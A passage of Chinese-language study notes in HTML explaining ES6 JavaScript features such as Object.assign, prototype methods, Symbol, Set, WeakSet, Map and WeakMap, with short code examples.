javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> target = &#123; <span class="attr">a</span>: &#123; <span class="attr">b</span>: <span class="string">&#x27;c&#x27;</span>, <span class="attr">d</span>: <span class="string">&#x27;e&#x27;</span> &#125; &#125;</span><br><span class="line"><span class="keyword">const</span> source = &#123; <span class="attr">a</span>: &#123; <span class="attr">b</span>: <span class="string">&#x27;hello&#x27;</span> &#125; &#125;</span><br><span class="line"><span class="built_in">Object</span>.assign(target, source)</span><br><span class="line"><span class="comment">// &#123; a: &#123; b: &#x27;hello&#x27; &#125; &#125;</span></span><br></pre></td></tr></table></figure><p><strong>（3）数组的处理</strong></p><p><code>Object.assign()</code>可以用来处理数组，但是会把数组视为对象。</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Object</span>.assign([<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>], [<span class="number">4</span>, <span class="number">5</span>])</span><br><span class="line"><span class="comment">// [4, 5, 3]</span></span><br></pre></td></tr></table></figure><p><strong>（4）取值函数的处理</strong></p><p><code>Object.assign()</code>只能进行值的复制，如果要复制的值是一个取值函数，那么将求值后再复制。</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> source = &#123;</span><br><span class="line">  <span class="keyword">get</span> <span class="title">foo</span>() &#123; <span class="keyword">return</span> <span class="number">1</span> &#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">const</span> target = &#123;&#125;;</span><br><span class="line"></span><br><span class="line"><span class="built_in">Object</span>.assign(target, source)</span><br><span class="line"><span class="comment">// &#123; foo: 1 &#125;</span></span><br></pre></td></tr></table></figure><p>上面代码中，<code>source</code>对象的<code>foo</code>属性是一个取值函数，<code>Object.assign()</code>不会复制这个取值函数，只会拿到值以后，将这个值复制过去。</p><h3 id="常见用途"><a href="#常见用途" class="headerlink" title="常见用途"></a>常见用途</h3><p><strong>（1）为对象添加属性</strong></p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Point</span> </span>&#123;</span><br><span class="line">  <span class="function"><span class="title">constructor</span>(<span class="params">x, y</span>)</span> &#123;</span><br><span class="line">    <span class="built_in">Object</span>.assign(<span class="built_in">this</span>, &#123;x, y&#125;);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>（2）为对象添加方法</strong></p><p><strong>（3）克隆对象</strong></p><p><strong>（4）合并多个对象</strong></p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> merge =</span><br><span class="line">  <span class="function">(<span class="params">...sources</span>) =&gt;</span> <span class="built_in">Object</span>.assign(&#123;&#125;, ...sources);</span><br></pre></td></tr></table></figure><p><strong>（5）为属性指定默认值</strong></p><h2 id="3、-proto-属性，Object-setPrototypeOf-，Object-getPrototypeOf"><a href="#3、-proto-属性，Object-setPrototypeOf-，Object-getPrototypeOf" class="headerlink" title="3、__proto__属性，Object.setPrototypeOf()，Object.getPrototypeOf()"></a>3、__proto__属性，Object.setPrototypeOf()，Object.getPrototypeOf()</h2><h3 id="proto-属性"><a href="#proto-属性" class="headerlink" title="__proto__属性"></a>__proto__属性</h3><p><code>__proto__</code>属性用来读取或设置当前对象的原型对象（prototype）。</p><h3 id="Object-setPrototypeOf"><a href="#Object-setPrototypeOf" class="headerlink" title="Object.setPrototypeOf()"></a>Object.setPrototypeOf()</h3><p><code>Object.setPrototypeOf</code>方法的作用与<code>__proto__</code>相同，用来设置一个对象的原型对象（prototype），返回参数对象本身。它是 ES6 正式推荐的设置原型对象的方法。等同于下面的函数。</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">setPrototypeOf</span>(<span class="params">obj, proto</span>) </span>&#123;</span><br><span class="line">  obj.__proto__ = proto;</span><br><span class="line">  <span class="keyword">return</span> obj;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> proto = &#123;&#125;;</span><br><span class="line"><span class="keyword">let</span> obj = &#123; <span class="attr">x</span>: <span class="number">10</span> &#125;;</span><br><span class="line"><span class="built_in">Object</span>.setPrototypeOf(obj, proto);</span><br><span class="line"></span><br><span class="line">proto.y = <span class="number">20</span>;</span><br><span class="line">proto.z = <span class="number">40</span>;</span><br><span class="line"></span><br><span class="line">obj.x <span class="comment">// 10</span></span><br><span class="line">obj.y <span class="comment">// 20</span></span><br><span class="line">obj.z <span class="comment">// 40</span></span><br></pre></td></tr></table></figure><p>上面代码将<code>proto</code>对象设为<code>obj</code>对象的原型，所以从<code>obj</code>对象可以读取<code>proto</code>对象的属性。</p><h3 id="Object-getPrototypeOf"><a href="#Object-getPrototypeOf" class="headerlink" title="Object.getPrototypeOf()"></a>Object.getPrototypeOf()</h3><p>该方法用于读取一个对象的原型对象。</p><h2 id="5、Object-keys-，Object-values-，Object-entries"><a href="#5、Object-keys-，Object-values-，Object-entries" class="headerlink" title="5、Object.keys()，Object.values()，Object.entries()"></a>5、Object.keys()，Object.values()，Object.entries()</h2><p>同数组的扩展。</p><h2 id="6、Object-fromEntries"><a href="#6、Object-fromEntries" class="headerlink" title="6、Object.fromEntries()"></a>6、Object.fromEntries()</h2><p><code>Object.fromEntries()</code>方法是<code>Object.entries()</code>的逆操作，用于将一个键值对数组转为对象。</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Object</span>.fromEntries([</span><br><span class="line">  [<span class="string">&#x27;foo&#x27;</span>, <span class="string">&#x27;bar&#x27;</span>],</span><br><span class="line">  [<span class="string">&#x27;baz&#x27;</span>, <span class="number">42</span>]</span><br><span class="line">])</span><br><span class="line"><span class="comment">// &#123; foo: &quot;bar&quot;, baz: 42 &#125;</span></span><br></pre></td></tr></table></figure><p>特别适合将 Map 结构转为对象。</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 例一</span></span><br><span class="line"><span class="keyword">const</span> entries = <span class="keyword">new</span> <span class="built_in">Map</span>([</span><br><span class="line">  [<span class="string">&#x27;foo&#x27;</span>, <span class="string">&#x27;bar&#x27;</span>],</span><br><span class="line">  [<span class="string">&#x27;baz&#x27;</span>, <span class="number">42</span>]</span><br><span class="line">]);</span><br><span class="line"></span><br><span class="line"><span class="built_in">Object</span>.fromEntries(entries)</span><br><span class="line"><span class="comment">// &#123; foo: &quot;bar&quot;, baz: 42 &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 例二</span></span><br><span class="line"><span class="keyword">const</span> map = <span class="keyword">new</span> <span class="built_in">Map</span>().set(<span class="string">&#x27;foo&#x27;</span>, <span class="literal">true</span>).set(<span class="string">&#x27;bar&#x27;</span>, <span class="literal">false</span>);</span><br><span class="line"><span class="built_in">Object</span>.fromEntries(map)</span><br><span class="line"><span class="comment">// &#123; foo: true, bar: false &#125;</span></span><br></pre></td></tr></table></figure><h1 id="Symbol"><a href="#Symbol" class="headerlink" title="Symbol"></a>Symbol</h1><h2 id="1、概述"><a href="#1、概述" class="headerlink" title="1、概述"></a>1、概述</h2><p>ES6 引入了一种新的原始数据类型<code>Symbol</code>，表示独一无二的值。它是 JavaScript 语言的第七种数据类型，前六种是：<code>undefined</code>、<code>null</code>、布尔值（Boolean）、字符串（String）、数值（Number）、对象（Object）。</p><p>Symbol 值通过<code>Symbol</code>函数生成。这就是说，对象的属性名现在可以有两种类型，一种是原来就有的字符串，另一种就是新增的 Symbol 类型。凡是属性名属于 Symbol 类型，就都是独一无二的，可以保证不会与其他属性名产生冲突。</p><p>注意，<code>Symbol</code>函数前不能使用<code>new</code>命令，否则会报错。这是因为生成的 Symbol 是一个原始类型的值，不是对象。也就是说，由于 Symbol 值不是对象，所以不能添加属性。</p><h2 id="2、作为属性名的-Symbol"><a href="#2、作为属性名的-Symbol" class="headerlink" title="2、作为属性名的 Symbol"></a>2、作为属性名的 Symbol</h2><p>由于每一个 Symbol 值都是不相等的，这意味着 Symbol 值可以作为标识符，用于对象的属性名，就能保证不会出现同名的属性。这对于一个对象由多个模块构成的情况非常有用，能防止某一个键被不小心改写或覆盖。</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> mySymbol = <span class="built_in">Symbol</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 第一种写法</span></span><br><span class="line"><span class="keyword">let</span> a = &#123;&#125;;</span><br><span class="line">a[mySymbol] = <span class="string">&#x27;Hello!&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 第二种写法</span></span><br><span class="line"><span class="keyword">let</span> a = &#123;</span><br><span class="line">  [mySymbol]: <span class="string">&#x27;Hello!&#x27;</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 第三种写法</span></span><br><span class="line"><span class="keyword">let</span> a = &#123;&#125;;</span><br><span class="line"><span class="built_in">Object</span>.defineProperty(a, mySymbol, &#123; <span class="attr">value</span>: <span class="string">&#x27;Hello!&#x27;</span> &#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 以上写法都得到同样结果</span></span><br><span class="line">a[mySymbol] <span class="comment">// &quot;Hello!&quot;</span></span><br></pre></td></tr></table></figure><p>注意，Symbol 值作为对象属性名时，不能用点运算符。</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> mySymbol = <span class="built_in">Symbol</span>();</span><br><span class="line"><span class="keyword">const</span> a = &#123;&#125;;</span><br><span class="line"></span><br><span class="line">a.mySymbol = <span class="string">&#x27;Hello!&#x27;</span>;</span><br><span class="line">a[mySymbol] <span class="comment">// undefined</span></span><br><span class="line">a[<span class="string">&#x27;mySymbol&#x27;</span>] <span class="comment">// &quot;Hello!&quot;</span></span><br></pre></td></tr></table></figure><p>上面代码中，因为点运算符后面总是字符串，所以不会读取<code>mySymbol</code>作为标识名所指代的那个值，导致<code>a</code>的属性名实际上是一个字符串，而不是一个 Symbol 值。</p><h2 id="3、属性名的遍历"><a href="#3、属性名的遍历" class="headerlink" title="3、属性名的遍历"></a>3、属性名的遍历</h2><p>Symbol 作为属性名，遍历对象的时候，该属性不会出现在<code>for...in</code>、<code>for...of</code>循环中，也不会被<code>Object.keys()</code>、<code>Object.getOwnPropertyNames()</code>、<code>JSON.stringify()</code>返回。</p><p>但是，它也不是私有属性，有一个<code>Object.getOwnPropertySymbols()</code>方法，可以获取指定对象的所有 Symbol 属性名。该方法返回一个数组，成员是当前对象的所有用作属性名的 Symbol 值。</p><p>另一个新的 API，<code>Reflect.ownKeys()</code>方法可以返回所有类型的键名，包括常规键名和 Symbol 键名。</p><h1 id="Set-和-Map-数据结构"><a href="#Set-和-Map-数据结构" class="headerlink" title="Set 和 Map 数据结构"></a>Set 和 Map 数据结构</h1><h2 id="1、Set"><a href="#1、Set" class="headerlink" title="1、Set"></a>1、Set</h2><h3 id="基本用法-5"><a href="#基本用法-5" class="headerlink" title="基本用法"></a>基本用法</h3><p>ES6 提供了新的数据结构 Set。它类似于数组，但是成员的值都是唯一的，没有重复的值。</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> s = <span class="keyword">new</span> <span class="built_in">Set</span>();</span><br><span class="line"></span><br><span class="line">[<span class="number">2</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">2</span>, <span class="number">2</span>].forEach(<span class="function"><span class="params">x</span> =&gt;</span> s.add(x));</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> i <span class="keyword">of</span> s) &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(i);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 2 3 5 4</span></span><br></pre></td></tr></table></figure><p><code>Set</code>函数可以接受一个数组（或者具有 iterable 接口的其他数据结构）作为参数，用来初始化。</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> set = <span class="keyword">new</span> <span class="built_in">Set</span>([<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">4</span>]);</span><br><span class="line">[...set]</span><br><span class="line"><span class="comment">// [1, 2, 3, 4] 数组去重</span></span><br></pre></td></tr></table></figure><p>上面的方法也可以用于，去除字符串里面的重复字符。</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">[...new <span class="built_in">Set</span>(<span class="string">&#x27;ababbc&#x27;</span>)].join(<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"><span class="comment">// &quot;abc&quot;</span></span><br></pre></td></tr></table></figure><p>在 Set 内部，两个<code>NaN</code>是相等的，两个对象总是不相等的。</p><h3 id="Set-实例的属性和方法"><a href="#Set-实例的属性和方法" class="headerlink" title="Set 实例的属性和方法"></a>Set 实例的属性和方法</h3><p>Set 结构的实例有以下属性。</p><ul><li><code>Set.prototype.constructor</code>：构造函数，默认就是<code>Set</code>函数。</li><li><code>Set.prototype.size</code>：返回<code>Set</code>实例的成员总数。</li></ul><p>Set 实例的方法分为两大类：操作方法（用于操作数据）和遍历方法（用于遍历成员）。下面先介绍四个操作方法。</p><ul><li><code>Set.prototype.add(value)</code>：添加某个值，返回 Set 结构本身。</li><li><code>Set.prototype.delete(value)</code>：删除某个值，返回一个布尔值，表示删除是否成功。</li><li><code>Set.prototype.has(value)</code>：返回一个布尔值，表示该值是否为<code>Set</code>的成员。</li><li><code>Set.prototype.clear()</code>：清除所有成员，没有返回值。</li></ul><p><code>Array.from</code>方法可以将 Set 结构转为数组。</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> items = <span class="keyword">new</span> <span class="built_in">Set</span>([<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>]);</span><br><span class="line"><span class="keyword">const</span> array = <span class="built_in">Array</span>.from(items);</span><br></pre></td></tr></table></figure><p>这就提供了去除数组重复成员的另一种方法。</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">dedupe</span>(<span class="params">array</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">Array</span>.from(<span class="keyword">new</span> <span class="built_in">Set</span>(array));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">dedupe([<span class="number">1</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>]) <span class="comment">// [1, 2, 3]</span></span><br></pre></td></tr></table></figure><h3 id="遍历操作"><a href="#遍历操作" class="headerlink" title="遍历操作"></a>遍历操作</h3><p>Set 结构的实例有四个遍历方法，可以用于遍历成员。由于 Set 结构没有键名，只有键值，所以<code>keys</code>方法和<code>values</code>方法的行为完全一致。</p><ul><li><code>Set.prototype.keys()</code>：返回键名的遍历器</li><li><code>Set.prototype.values()</code>：返回键值的遍历器</li><li><code>Set.prototype.entries()</code>：返回键值对的遍历器</li><li><code>Set.prototype.forEach()</code>：使用回调函数遍历每个成员</li></ul><p><strong>遍历的应用</strong></p><p><strong>扩展运算符（<code>...</code>）内部使用<code>for...of</code>循环</strong></p><p>使用 Set 可以很容易地实现并集（Union）、交集（Intersect）和差集（Difference）。</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> a = <span class="keyword">new</span> <span class="built_in">Set</span>([<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>]);</span><br><span class="line"><span class="keyword">let</span> b = <span class="keyword">new</span> <span class="built_in">Set</span>([<span class="number">4</span>, <span class="number">3</span>, <span class="number">2</span>]);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 并集</span></span><br><span class="line"><span class="keyword">let</span> union = <span class="keyword">new</span> <span class="built_in">Set</span>([...a, ...b]);</span><br><span class="line"><span class="comment">// Set &#123;1, 2, 3, 4&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 交集</span></span><br><span class="line"><span class="keyword">let</span> intersect = <span class="keyword">new</span> <span class="built_in">Set</span>([...a].filter(<span class="function"><span class="params">x</span> =&gt;</span> b.has(x)));</span><br><span class="line"><span class="comment">// set &#123;2, 3&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// （a 相对于 b 的）差集</span></span><br><span class="line"><span class="keyword">let</span> difference = <span class="keyword">new</span> <span class="built_in">Set</span>([...a].filter(<span class="function"><span class="params">x</span> =&gt;</span> !b.has(x)));</span><br><span class="line"><span class="comment">// Set &#123;1&#125;</span></span><br></pre></td></tr></table></figure><h2 id="2、WeakSet"><a href="#2、WeakSet" class="headerlink" title="2、WeakSet"></a>2、WeakSet</h2><h3 id="含义-1"><a href="#含义-1" class="headerlink" title="含义"></a>含义</h3><p>WeakSet 结构与 Set 类似，也是不重复的值的集合。但是，它与 Set 有两个区别。</p><ul><li>首先，WeakSet 的成员只能是对象，而不能是其他类型的值。</li><li>其次，WeakSet 中的对象都是弱引用，即<strong>垃圾回收机制不考虑 WeakSet 对该对象的引用</strong>，也就是说，如果其他对象都不再引用该对象，那么垃圾回收机制会自动回收该对象所占用的内存，不考虑该对象还存在于 WeakSet 之中。</li></ul><p>因此，WeakSet 适合临时存放一组对象，以及存放跟对象绑定的信息。只要这些对象在外部消失，它在 WeakSet 里面的引用就会自动消失。由于上面这个特点，WeakSet 的成员是不适合引用的，因为它会随时消失。另外，由于 WeakSet 内部有多少个成员，取决于垃圾回收机制有没有运行，运行前后很可能成员个数是不一样的，而垃圾回收机制何时运行是不可预测的，因此 ES6 规定 <strong>WeakSet 不可遍历</strong>。</p><h3 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h3><p>作为构造函数，WeakSet 可以接受一个数组或类似数组的对象作为参数。</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> a = [[<span class="number">1</span>, <span class="number">2</span>], [<span class="number">3</span>, <span class="number">4</span>]];</span><br><span class="line"><span class="keyword">const</span> ws = <span class="keyword">new</span> <span class="built_in">WeakSet</span>(a);</span><br><span class="line"><span class="comment">// WeakSet &#123;[1, 2], [3, 4]&#125;</span></span><br></pre></td></tr></table></figure><p>WeakSet 结构有以下三个方法。</p><ul><li>**WeakSet.prototype.add(value)**：向 WeakSet 实例添加一个新成员。</li><li>**WeakSet.prototype.delete(value)**：清除 WeakSet 实例的指定成员。</li><li>**WeakSet.prototype.has(value)**：返回一个布尔值，表示某个值是否在 WeakSet 实例之中。</li></ul><h2 id="3、Map"><a href="#3、Map" class="headerlink" title="3、Map"></a>3、Map</h2><h3 id="含义和基本用法"><a href="#含义和基本用法" class="headerlink" title="含义和基本用法"></a>含义和基本用法</h3><p>JavaScript 的对象（Object），本质上是键值对的集合（Hash 结构），但是传统上只能用字符串当作键。这给它的使用带来了很大的限制。</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> data = &#123;&#125;;</span><br><span class="line"><span class="keyword">const</span> element = <span class="built_in">document</span>.getElementById(<span class="string">&#x27;myDiv&#x27;</span>);</span><br><span class="line"></span><br><span class="line">data[element] = <span class="string">&#x27;metadata&#x27;</span>;</span><br><span class="line">data[<span class="string">&#x27;[object HTMLDivElement]&#x27;</span>] <span class="comment">// &quot;metadata&quot;</span></span><br></pre></td></tr></table></figure><p>上面代码原意是将一个 DOM 节点作为对象<code>data</code>的键，但是由于对象只接受字符串作为键名，所以<code>element</code>被自动转为字符串<code>[object HTMLDivElement]</code>。</p><p>ES6 提供了 Map 数据结构。它类似于对象，也是键值对的集合，但是“键”的范围不限于字符串，各种类型的值（包括对象）都可以当作键。</p><p>Map 的键实际上是跟内存地址绑定的，只要内存地址不一样，就视为两个键。这就解决了同名属性碰撞（clash）的问题。</p><h3 id="实例的属性和操作方法"><a href="#实例的属性和操作方法" class="headerlink" title="实例的属性和操作方法"></a>实例的属性和操作方法</h3><p><strong>（1）size 属性</strong></p><p><code>size</code>属性返回 Map 结构的成员总数。</p><p><strong>（2）Map.prototype.set(key, value)</strong></p><p><code>set</code>方法设置键名<code>key</code>对应的键值为<code>value</code>，然后返回整个 Map 结构。如果<code>key</code>已经有值，则键值会被更新，否则就新生成该键。<code>set</code>方法返回的是当前的<code>Map</code>对象，因此可以采用链式写法。</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> map = <span class="keyword">new</span> <span class="built_in">Map</span>()</span><br><span class="line">  .set(<span class="number">1</span>, <span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">  .set(<span class="number">2</span>, <span class="string">&#x27;b&#x27;</span>)</span><br><span class="line">  .set(<span class="number">3</span>, <span class="string">&#x27;c&#x27;</span>);</span><br></pre></td></tr></table></figure><p><code>set</code>方法返回的是当前的<code>Map</code>对象，因此可以采用链式写法。</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> map = <span class="keyword">new</span> <span class="built_in">Map</span>()</span><br><span class="line">  .set(<span class="number">1</span>, <span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">  .set(<span class="number">2</span>, <span class="string">&#x27;b&#x27;</span>)</span><br><span class="line">  .set(<span class="number">3</span>, <span class="string">&#x27;c&#x27;</span>);</span><br></pre></td></tr></table></figure><p><strong>（3）Map.prototype.get(key)</strong></p><p><code>get</code>方法读取<code>key</code>对应的键值，如果找不到<code>key</code>，返回<code>undefined</code>。</p><p><strong>（4）Map.prototype.has(key)</strong></p><p><code>has</code>方法返回一个布尔值，表示某个键是否在当前 Map 对象之中。</p><p><strong>（5）Map.prototype.delete(key)</strong></p><p><code>delete</code>方法删除某个键，返回<code>true</code>。如果删除失败，返回<code>false</code>。</p><p><strong>（6）Map.prototype.clear()</strong></p><p><code>clear</code>方法清除所有成员，没有返回值。</p><h3 id="遍历方法"><a href="#遍历方法" class="headerlink" title="遍历方法"></a>遍历方法</h3><p>Map 结构原生提供三个遍历器生成函数和一个遍历方法。</p><ul><li><code>Map.prototype.keys()</code>：返回键名的遍历器。</li><li><code>Map.prototype.values()</code>：返回键值的遍历器。</li><li><code>Map.prototype.entries()</code>：返回所有成员的遍历器。</li><li><code>Map.prototype.forEach()</code>：遍历 Map 的所有成员。</li></ul><h3 id="与其他数据结构的互相转换"><a href="#与其他数据结构的互相转换" class="headerlink" title="与其他数据结构的互相转换"></a>与其他数据结构的互相转换</h3><p><strong>（1）Map 转为数组</strong></p><p>前面已经提过，Map 转为数组最方便的方法，就是使用扩展运算符（<code>...</code>）。</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> myMap = <span class="keyword">new</span> <span class="built_in">Map</span>()</span><br><span class="line">  .set(<span class="literal">true</span>, <span class="number">7</span>)</span><br><span class="line">  .set(&#123;<span class="attr">foo</span>: <span class="number">3</span>&#125;, [<span class="string">&#x27;abc&#x27;</span>]);</span><br><span class="line">[...myMap]</span><br><span class="line"><span class="comment">// [ [ true, 7 ], [ &#123; foo: 3 &#125;, [ &#x27;abc&#x27; ] ] ]</span></span><br></pre></td></tr></table></figure><p><strong>（2）数组 转为 Map</strong></p><p>将数组传入 Map 构造函数，就可以转为 Map。</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">new</span> <span class="built_in">Map</span>([</span><br><span class="line">  [<span class="literal">true</span>, <span class="number">7</span>],</span><br><span class="line">  [&#123;<span class="attr">foo</span>: <span class="number">3</span>&#125;, [<span class="string">&#x27;abc&#x27;</span>]]</span><br><span class="line">])</span><br></pre></td></tr></table></figure><p><strong>（3）Map 转为对象</strong></p><p>如果所有 Map 的键都是字符串，它可以无损地转为对象。</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">strMapToObj</span>(<span class="params">strMap</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">let</span> obj = <span class="built_in">Object</span>.create(<span class="literal">null</span>);</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">let</span> [k,v] <span class="keyword">of</span> strMap) &#123;</span><br><span class="line">    obj[k] = v;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> obj;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>（4）对象转为 Map</strong></p><p>对象转为 Map 可以通过<code>Object.entries()</code>。</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> obj = &#123;<span class="string">&quot;a&quot;</span>:<span class="number">1</span>, <span class="string">&quot;b&quot;</span>:<span class="number">2</span>&#125;;</span><br><span class="line"><span class="keyword">let</span> map = <span class="keyword">new</span> <span class="built_in">Map</span>(<span class="built_in">Object</span>.entries(obj));</span><br><span class="line"></span><br><span class="line"><span class="comment">//或者自己实现</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">objToStrMap</span>(<span class="params">obj</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">let</span> strMap = <span class="keyword">new</span> <span class="built_in">Map</span>();</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">let</span> k <span class="keyword">of</span> <span class="built_in">Object</span>.keys(obj)) &#123;</span><br><span class="line">    strMap.set(k, obj[k]);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> strMap;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>（5）Map 转为 JSON</strong></p><p>Map 转为 JSON 要区分两种情况。一种情况是，Map 的键名都是字符串，这时可以选择转为对象 JSON。</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">strMapToJson</span>(<span class="params">strMap</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">JSON</span>.stringify(strMapToObj(strMap));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>另一种情况是，Map 的键名有非字符串，这时可以选择转为数组 JSON。</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">mapToArrayJson</span>(<span class="params">map</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">JSON</span>.stringify([...map]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>（6）JSON 转为 Map</strong></p><p>JSON 转为 Map，正常情况下，所有键名都是字符串。</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">jsonToStrMap</span>(<span class="params">jsonStr</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> objToStrMap(<span class="built_in">JSON</span>.parse(jsonStr));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>但是，有一种特殊情况，整个 JSON 就是一个数组，且每个数组成员本身，又是一个有两个成员的数组。这时，它可以一一对应地转为 Map。这往往是 Map 转为数组 JSON 的逆操作。</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">jsonToMap</span>(<span class="params">jsonStr</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">Map</span>(<span class="built_in">JSON</span>.parse(jsonStr));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="4、WeakMap"><a href="#4、WeakMap" class="headerlink" title="4、WeakMap"></a>4、WeakMap</h2><h3 id="含义-2"><a href="#含义-2" class="headerlink" title="含义"></a>含义</h3><p><code>WeakMap</code>与<code>Map</code>的区别有两点。</p><ul><li>首先，<code>WeakMap</code>只接受对象作为键名（<code>null</code>除外），不接受其他类型的值作为键名。</li><li>其次，<code>WeakMap</code>的键名所指向的对象，不计入垃圾回收机制。</li></ul><p><code>WeakMap</code>的设计目的在于，有时我们想在某个对象上面存放一些数据，但是这会形成对于这个对象的引用。</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> e1 = <span class="built_in">document</span>.getElementById(<span class="string">&#x27;foo&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> e2 = <span class="built_in">document</span>.getElementById(<span class="string">&#x27;bar&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> arr = [</span><br><span class="line">  [e1, <span class="string">&#x27;foo 元素&#x27;</span>],</span><br><span class="line">  [e2, <span class="string">&#x27;bar 元素&#x27;</span>],</span><br><span class="line">];</span><br><span class="line"></span><br><span class="line"><span class="comment">// 不需要 e1 和 e2 的时候 必须手动删除引用</span></span><br><span class="line">arr [<span class="number">0</span>] = <span class="literal">null</span>;</span><br><span class="line">arr [<span class="number">1</span>] = <span class="literal">null</span>;</span><br></pre></td></tr></table></figure><p>上面代码中，<code>e1</code>和<code>e2</code>是两个对象，我们通过<code>arr</code>数组对这两个对象添加一些文字说明。这就形成了<code>arr</code>对<code>e1</code>和<code>e2</code>的引用。一旦不再需要这两个对象，我们就必须手动删除这个引用，否则垃圾回收机制就不会释放<code>e1</code>和<code>e2</code>占用的内存。</p><p>WeakMap 就是为了解决这个问题而诞生的，它的键名所引用的对象都是弱引用，即垃圾回收机制不将该引用考虑在内。即一旦不再需要，WeakMap 里面的键名对象和所对应的键值对会自动消失，不用手动删除引用。</p><p>一个典型应用场景是，在网页的 DOM 元素上添加数据，就可以使用<code>WeakMap</code>结构。当该 DOM 元素被清除，其所对应的<code>WeakMap</code>记录就会自动被移除。</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> wm = <span class="keyword">new</span> <span class="built_in">WeakMap</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> element = <span class="built_in">document</span>.getElementById(<span 